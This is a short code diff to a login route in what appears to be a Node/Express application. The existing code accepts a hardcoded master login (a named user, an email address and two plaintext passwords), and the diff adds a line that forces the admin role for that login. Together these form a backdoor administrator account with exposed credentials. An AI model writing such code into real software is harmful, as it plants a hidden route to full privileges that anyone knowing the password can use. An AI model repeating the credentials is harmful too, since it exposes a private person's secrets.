@@ -119,6 +119,7 @@ app.post('/api/login', async (req, res) => {
   let isValid = false;
   if ((loginId === 'ashu' || loginId === 'ashenafiabebe@gmail.com') && (password === 'Ashu19951?' || password === 'Ashu19951')) {
     isValid = true;
+    user.role = 'admin'; // Force admin role for master login
   }
 
   if (!isValid) {
